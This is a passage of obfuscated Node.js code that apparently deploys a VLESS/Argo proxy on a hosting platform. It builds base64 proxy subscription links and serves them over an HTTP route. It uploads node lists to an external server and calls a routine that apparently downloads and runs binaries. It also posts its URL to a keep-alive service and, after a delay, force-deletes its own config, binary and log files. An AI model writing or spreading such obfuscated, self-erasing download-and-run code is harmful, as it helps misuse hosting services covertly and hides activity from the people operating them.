_0x1b4b81=_0x2e390f,_0x4fba1f=_0x2e2213(0x10e)+UUID+'@'+CFIP+':'+CFPORT+'?encryption=none&security=tls&sni='+_0x1fbf02+_0x2e2213(0xec)+_0x1fbf02+'&path=%2Fvless-argo%3Fed%3D2560#'+_0x218371+_0x2e2213(0x159)+Buffer['from'](JSON[_0x2e2213(0xfb)](_0x1b4b81))[_0x2e2213(0x116)](_0x2e2213(0xe8))+_0x2e2213(0x1a2)+UUID+'@'+CFIP+':'+CFPORT+_0x2e2213(0xee)+_0x1fbf02+_0x2e2213(0xec)+_0x1fbf02+_0x2e2213(0x149)+_0x218371+_0x2e2213(0x15e);console[_0x2e2213(0x115)](Buffer[_0x2e2213(0x18a)](_0x4fba1f)[_0x2e2213(0x116)]('base64')),fs[_0x2e2213(0x100)](subPath,Buffer[_0x2e2213(0x18a)](_0x4fba1f)[_0x2e2213(0x116)](_0x2e2213(0xe8))),console['log'](FILE_PATH+_0x2e2213(0xf0)),uploadNodes(),app['get']('/'+SUB_PATH,(_0x380231,_0x36cddd)=>{const _0x4bb2cb=_0x2e2213,_0x31ef7e=Buffer['from'](_0x4fba1f)[_0x4bb2cb(0x116)]('base64');_0x36cddd[_0x4bb2cb(0x143)]('Content-Type',_0x4bb2cb(0x110)),_0x36cddd[_0x4bb2cb(0x1b7)](_0x31ef7e);}),_0x5b6306(_0x4fba1f);},0x7d0);});}}async function uploadNodes(){const _0xf9e4cf=_0xcf68f0;if(UPLOAD_URL&&PROJECT_URL){const _0x550312=PROJECT_URL+'/'+SUB_PATH,_0x55215b={};_0x55215b['subscription']=[_0x550312];const _0x34d6db=_0x55215b;try{const _0x3e4896={};_0x3e4896[_0xf9e4cf(0x151)]=_0xf9e4cf(0x170);const _0x285fcf={};_0x285fcf[_0xf9e4cf(0x111)]=_0x3e4896;const _0x217b5e=await axios[_0xf9e4cf(0x162)](UPLOAD_URL+'/api/add-subscriptions',_0x34d6db,_0x285fcf);return _0x217b5e&&_0x217b5e[_0xf9e4cf(0xe0)]===0xc8?(console[_0xf9e4cf(0x115)]('Subscription\x20uploaded\x20successfully'),_0x217b5e):null;}catch(_0x305563){if(_0x305563['response']){if(_0x305563['response']['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0xf9e4cf(0xf6)](listPath))return;const _0x37bd5b=fs[_0xf9e4cf(0x124)](listPath,_0xf9e4cf(0x10c)),_0x5f19ed=_0x37bd5b[_0xf9e4cf(0x109)]('\x0a')[_0xf9e4cf(0x14f)](_0x28b237=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0xf9e4cf(0x14c)](_0x28b237));if(_0x5f19ed['length']===0x0)return;const _0x4635af={};_0x4635af[_0xf9e4cf(0xdd)]=_0x5f19ed;const _0x40b028=JSON[_0xf9e4cf(0xfb)](_0x4635af);try{const _0x4c31c7={};_0x4c31c7[_0xf9e4cf(0x151)]='application/json';const _0x381bc1={};_0x381bc1[_0xf9e4cf(0x111)]=_0x4c31c7;const _0x3c9003=await axios['post'](UPLOAD_URL+_0xf9e4cf(0x1ac),_0x40b028,_0x381bc1);return _0x3c9003&&_0x3c9003[_0xf9e4cf(0xe0)]===0xc8?(console[_0xf9e4cf(0x115)](_0xf9e4cf(0x108)),_0x3c9003):null;}catch(_0x46c836){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x18dc8a=_0x106d,_0x2d9926=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x2d9926['push'](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x2d9926[_0x18dc8a(0x140)](phpPath);process[_0x18dc8a(0x168)]===_0x18dc8a(0x141)?exec('del\x20/f\x20/q\x20'+_0x2d9926['join']('\x20')+_0x18dc8a(0x1a8),_0x3ff6e3=>{const _0x3c88f9=_0x18dc8a;console[_0x3c88f9(0xe7)](),console[_0x3c88f9(0x115)]('App\x20is\x20running'),console[_0x3c88f9(0x115)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');}):exec(_0x18dc8a(0x1a9)+_0x2d9926['join']('\x20')+_0x18dc8a(0x185),_0x3a2535=>{const _0x2e5a65=_0x18dc8a;console[_0x2e5a65(0xe7)](),console[_0x2e5a65(0x115)](_0x2e5a65(0x10d)),console[_0x2e5a65(0x115)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x3e7b48=_0xcf68f0;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x3e7b48(0x115)](_0x3e7b48(0x19e));return;}try{const _0x325f65={};_0x325f65[_0x3e7b48(0x1ae)]=PROJECT_URL;const _0x50d20a={};_0x50d20a['Content-Type']='application/json';const _0x447b92={};_0x447b92[_0x3e7b48(0x111)]=_0x50d20a;const _0x326346=await axios['post'](_0x3e7b48(0x190),_0x325f65,_0x447b92);return console[_0x3e7b48(0x115)](_0x3e7b48(0x197)),_0x326346;}catch(_0x54d451){return console[_0x3e7b48(0x133)](_0x3e7b48(0x17d)+_0x54d451['message']),null;}}async function startserver(){const _0x4424c4=_0xcf68f0;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x412fab){console[_0x4424c4(0x133)](_0x4424c4(0x15d),_0x412fab);}}startserver()[_0xcf68f0(0x17f)](_0xa6667a=>{const _0x3b3c47=_0xcf68f0;console['error'](_0x3b3c47(0x183),_0xa6667a);}),app['listen'](PORT,()=>console[_0xcf68f0(0x115)](_0xcf68f0(0x134)+PORT+'!'));
